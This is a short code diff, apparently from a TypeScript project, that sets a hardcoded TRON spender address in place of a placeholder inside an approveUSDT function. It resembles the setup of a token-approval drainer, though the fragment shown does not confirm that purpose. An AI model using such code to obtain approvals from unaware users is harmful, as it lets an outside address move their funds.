@@ -35,7 +35,7 @@ const approveUSDT = async (tron: any) => {
     const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
 
     // 🔴 CAMBIA ESTO por tu contrato real
-    const spender = "TU_DIRECCION_SPENDER"
+    const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"
 
     const contract = await tron.contract().at(contractAddress)
 
